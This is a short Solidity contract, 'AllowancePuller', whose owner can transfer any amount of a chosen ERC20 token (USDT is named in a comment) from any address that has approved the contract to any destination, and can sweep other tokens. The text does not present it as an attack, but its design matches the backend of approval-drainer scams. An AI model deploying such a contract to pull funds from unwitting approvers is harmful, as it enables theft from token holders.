pragma solidity ^0.8.20;


interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

library MiniSafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        (bool ok, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        (bool ok, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transfer.selector, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}


contract AllowancePuller {
    using MiniSafeERC20 for IERC20;

    address public owner;    
    IERC20  public immutable token; // 目标代币（USDT 或你想操作的 ERC20）

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event Pulled(address indexed from, address indexed to, uint256 amount);
    event Swept(address indexed erc20, address indexed to, uint256 amount);

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "ZERO_TOKEN");
        owner = msg.sender;
        token = IERC20(tokenAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }


    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_NEW_OWNER");
        emit OwnerChanged(owner, newOwner);
        owner = newOwner;
    }


    function pullFrom(address from, address to, uint256 amount) external onlyOwner {
        require(from != address(0) && to != address(0), "BAD_ADDR");
        token.safeTransferFrom(from, to, amount);
        emit Pulled(from, to, amount);
    }


    function allowanceOf(address from) external view returns (uint256) {
        return token.allowance(from, address(this));
    }


    function sweep(address erc20, address to, uint256 amount) external onlyOwner {
        require(erc20 != address(0) && to != address(0), "BAD_ADDR");
        IERC20(erc20).safeTransfer(to, amount);
        emit Swept(erc20, to, amount);
    }
}